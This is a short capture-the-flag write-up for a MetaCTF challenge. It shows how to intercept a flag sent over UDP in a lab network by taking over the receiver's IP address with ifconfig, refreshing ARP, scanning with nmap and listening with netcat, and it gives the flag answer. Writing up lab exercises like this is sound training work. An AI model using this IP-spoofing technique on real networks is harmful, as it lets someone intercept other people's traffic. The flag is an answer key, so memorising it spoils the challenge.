# Interception I
192.168.0.1 is periodically (once every 4 seconds) sending the flag to 192.168.0.2 over UDP port 8000. Go get it.
ssh ctf-1@host.cg21.metaproblems.com -p 7000

If you get an SSH host key error, consider using
ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" ctf-1@host.cg21.metaproblems.com -p 7000

Note that the connection can take a while to initialize. It will say Granting console connection to device... and then three dots will appear. After the third dot you should have a connection. 

## Solve (Note I did this at 2 AM)
Gotta do some ip spoofing.

1. first changed ip address to spoofy

`ifconfig eth0 192.168.0.2 netmask 255.255.255.0`

2. then do a lil ping to test connection and refresh arp cache so we changed the ip address

`ping 192.168.0.1`

3. then do a lil nmap mappy

`nmap -sn -PU 192.168.0.0/24`

4. then do a lil net catty cat

`nc -lu 192.168.0.2 8000`

`MetaCTF{addr3s5_r3s0lut1on_pwn4g3}`